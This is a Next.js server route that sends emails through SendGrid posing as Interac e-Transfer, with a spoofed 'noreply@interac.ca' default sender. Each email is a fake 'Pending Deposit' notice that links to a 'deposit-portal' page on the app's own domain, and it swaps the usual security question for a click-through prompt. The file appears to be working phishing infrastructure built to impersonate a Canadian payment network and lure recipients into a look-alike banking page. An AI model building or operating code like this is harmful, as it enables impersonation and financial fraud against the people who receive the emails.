import { type NextRequest, NextResponse } from "next/server"
import { generateInteracEmailHtml } from "@/lib/email-template"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { recipient, recipientName, amount, transferId, bankName, message, timestamp } = body

    if (!recipient || !amount || !transferId) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    const amountNumber = typeof amount === "string" ? Number.parseFloat(amount) : amount

    if (isNaN(amountNumber)) {
      return NextResponse.json({ error: "Invalid amount format" }, { status: 400 })
    }

    const depositUrl = `${process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000"}/deposit-portal?transferId=${transferId}&amount=${amount}&recipient=${recipient}&recipientName=${encodeURIComponent(recipientName || "")}&bankName=${encodeURIComponent(bankName || "Banking System")}&message=${encodeURIComponent(message || "")}&timestamp=${timestamp}`

    const html = generateInteracEmailHtml({
      amount: amountNumber,
      senderName: "Interac e-Transfer",
      recipientName: recipientName || recipient,
      securityQuestion: "Pending Deposit Notification",
      securityAnswer: "Click the button below to view details",
      message: message || `Transaction ID: ${transferId}`,
      depositLink: depositUrl,
      transferId: transferId,
      institution: bankName || "Banking System",
    })

    const response = await fetch("https://api.sendgrid.com/v3/mail/send", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${process.env.SENDGRID_API_KEY}`,
      },
      body: JSON.stringify({
        personalizations: [
          {
            to: [{ email: recipient, name: recipientName || recipient }],
          },
        ],
        from: {
          email: process.env.SENDGRID_FROM_EMAIL || "noreply@interac.ca",
          name: "Interac e-Transfer",
        },
        subject: `Pending Deposit - ${transferId}`,
        content: [
          {
            type: "text/html",
            value: html,
          },
        ],
      }),
    })

    if (!response.ok) {
      const errorText = await response.text()
      console.error("SendGrid error:", errorText)
      return NextResponse.json({ error: "Failed to send email", details: errorText }, { status: 500 })
    }

    return NextResponse.json({ success: true, message: "Pending deposit email sent successfully" })
  } catch (error) {
    console.error("Error sending pending deposit email:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
